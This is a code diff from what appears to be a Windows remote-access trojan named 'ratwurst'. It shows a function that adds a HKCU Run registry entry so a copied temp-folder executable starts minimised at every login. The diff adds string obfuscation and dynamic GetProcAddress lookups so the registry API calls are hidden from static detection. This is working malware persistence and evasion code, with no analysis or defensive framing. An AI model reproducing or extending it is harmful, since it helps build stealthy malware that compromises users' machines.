@@ -360,7 +360,10 @@ CopyAndRunFromTempFolder(char* currentPath, char* newPath)
 int SetupRegistryKey(const char* execPath)
 {
 	HKEY keyHandle;
-	LSTATUS regOpenStatus = RegOpenKeyExA(HKEY_CURRENT_USER,
+
+	char ca_RegOpenKeyExA[] = { 'R','e','g','O','p','e','n','K','e','y','E','x','A',0 };
+	_RegOpenKeyExA* f_RegOpenKeyExA = (_RegOpenKeyExA*)GetProcAddress(gLibraryKernel32, ca_RegOpenKeyExA);
+	LSTATUS regOpenStatus = f_RegOpenKeyExA(HKEY_CURRENT_USER,
 										  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 										  0, KEY_WRITE, &keyHandle);
 	if ( regOpenStatus != ERROR_SUCCESS )
@@ -371,7 +374,6 @@ int SetupRegistryKey(const char* execPath)
 		return 1;
 	}
 
-	// cmd.exe /s /c start "" /min C:\Users\karlo\AppData\Local\Temp\rtwst.tmp
 	char ca_command[] = { 'c','m','d','.','e','x','e',' ','/','s',' ','/','c',' ','s','t','a','r','t',' ','"','"',' ','/','m','i','n',' ',0 };
 	size_t lenCommand = strlen(ca_command) + 1;
 	size_t lenExecPath = strlen(execPath) + 1;
@@ -379,8 +381,10 @@ int SetupRegistryKey(const char* execPath)
 	char* regValue = (char*)calloc(lenRegValue, sizeof(char));
 	strncpy_s(regValue, lenRegValue, ca_command, lenCommand);
 	strncat_s(regValue, lenRegValue, execPath, lenExecPath);
-	
-	LSTATUS regSetStatus = RegSetValueExA(keyHandle,
+
+	char ca_RegSetValueExA[] = { 'R','e','g','S','e','t','V','a','l','u','e','E','x','A',0 };
+	_RegSetValueExA* f_RegSetValueExA = (_RegSetValueExA*)GetProcAddress(gLibraryKernel32, ca_RegSetValueExA);
+	LSTATUS regSetStatus = f_RegSetValueExA(keyHandle,
 										  "ratwurst",
 										  0,
 										  REG_SZ,
@@ -396,7 +400,9 @@ int SetupRegistryKey(const char* execPath)
 
 	free(regValue);
 
-	RegCloseKey(keyHandle);
+	char ca_RegCloseKey[] = { 'R','e','g','C','l','o','s','e','K','e','y',0 };
+	_RegCloseKey* f_RegCloseKey = (_RegCloseKey*)GetProcAddress(gLibraryKernel32, ca_RegCloseKey);
+	f_RegCloseKey(keyHandle);
 	return 0;
 }
 
